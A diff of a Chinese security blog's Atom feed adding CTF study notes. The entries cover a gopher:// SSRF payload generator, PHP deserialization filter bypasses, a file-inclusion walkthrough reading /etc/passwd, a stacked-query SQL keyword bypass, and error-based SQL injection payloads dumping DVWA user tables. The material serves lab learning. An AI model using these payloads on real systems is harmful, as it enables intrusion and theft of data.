+    <content type="html"><![CDATA[<h1 id="gopher-协议使用"><a href="#gopher-协议使用" class="headerlink" title="gopher:&#x2F;&#x2F;协议使用"></a>gopher:&#x2F;&#x2F;协议使用</h1><p>标签（空格分隔）： SSRF</p><hr><p>|gopher|发送原始 TCP 数据（高级利用）|构造gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%23…（向 MySQL 发送恶意 SQL 命令）|<br>|——|</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">传输脚本如下</span><br><span class="line"># 导入urllib.parse模块，用于URL编码处理</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 定义目标主机和端口</span><br><span class="line">host = &quot;127.0.0.1:80&quot;</span><br><span class="line"># 定义POST请求的表单数据（模拟登录的用户名和密码）\\\\\\\\\\\\\\\\\\\\注意根据题目不同进行参数更改</span><br><span class="line">content = &quot;uname=admin&amp;passwd=admin&quot;</span><br><span class="line"># 计算POST数据的长度，用于HTTP头中的Content-Length字段</span><br><span class="line">content_length = len(content)</span><br><span class="line"></span><br><span class="line"># 构造完整的POST请求报文（HTTP协议格式）</span><br><span class="line">test =\</span><br><span class="line">&quot;&quot;&quot;POST /index.php HTTP/1.1  # HTTP方法为POST，请求路径为/index.php，协议版本1.1</span><br><span class="line">Host: &#123;&#125;  # 目标主机（通过format填充上面定义的host变量）</span><br><span class="line">User-Agent: curl/7.43.0  # 模拟curl的User-Agent头</span><br><span class="line">Accept: */*  # 接受所有类型的响应数据</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  # 表单数据的MIME类型</span><br><span class="line">Content-Length: &#123;&#125;  # POST数据的长度（通过format填充content_length变量）</span><br><span class="line"></span><br><span class="line">&#123;&#125;  # POST请求的表单数据（通过format填充content变量）</span><br><span class="line"># &quot;&quot;&quot;.format(host,content_length,content)  # 用format方法替换占位符，填充host、长度和数据</span><br><span class="line"></span><br><span class="line"># 对构造的HTTP报文进行第一次URL编码（将特殊字符转为%XX格式）</span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line"># 将编码后的换行符%0A（\n）替换为HTTP标准的回车换行%0D%0A（\r\n），避免协议解析错误</span><br><span class="line">new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)</span><br><span class="line"># 对处理后的字符串进行第二次URL编码，确保gopher协议能正确解析</span><br><span class="line">result = urllib.parse.quote(new)</span><br><span class="line"># 拼接为gopher协议URL（格式：gopher://主机/_编码后的请求内容），用于SSRF等场景</span><br><span class="line">print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;gopher-协议使用&quot;&gt;&lt;a href=&quot;#gopher-协议使用&quot; class=&quot;headerlink&quot; title=&quot;gopher:&amp;#x2F;&amp;#x2F;协议使用&quot;&gt;&lt;/a&gt;gopher:&amp;#x2F;&amp;#x2F;协议使用&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： </summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SSRF" scheme="https://smileless-l.github.io/tags/SSRF/"/>
     
   </entry>
   
@@ -369,22 +335,19 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T16:56:27.596Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;php魔术技巧&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： PHP #魔术技巧#&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;php魔术技巧&quot;&gt;&lt;a href=&quot;#php魔术技巧&quot; class=&quot;headerlink&quot; title=&quot;php魔术技巧&quot;&gt;&lt;/a&gt;php魔术技巧&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： PHP #魔术技巧#&lt;/p&gt;
 &lt;p&gt;—php&lt;/p&gt;
-&lt;p&gt;反序列化的基本格式：O:组的字节:“定义的组的名字”:有几个参数:{s:4:“flag”;s:3:“111”;}&lt;/p&gt;
-&lt;p&gt;构造脚本可以在后面这么加$A</summary>
-        
+&lt;p&gt;反序列化的基本格式：</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
@@ -398,24 +361,19 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T16:57:15.390Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;文件包含漏洞&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： 文件类&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： 文件类&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析&lt;br&gt;
-以攻防世界----catcat-new为例&lt;br&gt;
-看着没有什么输入口但是观察URL–&lt;/p&gt;
-&lt;p&gt;&lt;a</summary>
-        
+&lt;p&gt;通常没有看到可以输入的框的时候可以试着看看URL的构造来</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="PHP" scheme="https://smileless-l.github.io/tags/PHP/"/>
@@ -429,23 +387,19 @@ handler函数使用&lt;br&gt;
     <published>2026-01-28T13:45:00.000Z</published>
     <updated>2026-02-06T17:06:07.346Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;预编译拼接字符法&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;预编译拼接字符法&quot;&gt;&lt;a href=&quot;#预编译拼接字符法&quot; class=&quot;headerlink&quot; title=&quot;预编译拼接字符法&quot;&gt;&lt;/a&gt;预编译拼接字符法&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;直接concat函数来进行一个拼接字符串的方法&lt;br&gt;
-&lt;code&gt;语法&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight</summary>
-        
+&lt;p&gt;直接concat函数来进行一个拼接字</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
@@ -459,24 +413,20 @@ handler函数使用&lt;br&gt;
     <published>2026-01-27T16:00:00.000Z</published>
     <updated>2026-02-06T17:08:18.429Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h1><p>标签（空格分隔）： SQL</p><hr><p>–首先引入两个函数</p><p>##updatexml（）函数</p><p><code>函数语法:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p><code>函数原理：</code><br>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</span><br></pre></td></tr></table></figure><p><code>注入流程:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆数据库表相关信息：</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息：</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆数据库内容</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</span><br></pre></td></tr></table></figure><hr><p>##extractvalue（）函数<br><code>函数语法:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><p><code>函数原理:</code></p><p>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user,password from users where user_id=1 and (extractvalue(1,0x7e));</span><br><span class="line"></span><br><span class="line">由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</span><br></pre></td></tr></table></figure><p><code>注入流程:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆库表信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</span><br><span class="line"></span><br><span class="line">爆当前数据库信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</span><br><span class="line"></span><br><span class="line">爆当前表行信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) #</span><br><span class="line"></span><br><span class="line">抓字段</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</span><br></pre></td></tr></table></figure>]]></content>
+    
     
       
       
-        
-        
-    <summary type="html">&lt;h1&gt;SQL报错注入&lt;/h1&gt;
-&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL报错注入&quot;&gt;&lt;a href=&quot;#SQL报错注入&quot; class=&quot;headerlink&quot; title=&quot;SQL报错注入&quot;&gt;&lt;/a&gt;SQL报错注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;–首先引入两个函数&lt;/p&gt;
-&lt;p&gt;##updatexml（）函数&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;函数语法:&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight</summary>
-        
+&lt;p&gt;##updat</summary>
       
     
     
     
-    <category term="Web" scheme="https://smileless-l.github.io/categories/web/"/>
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
     <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
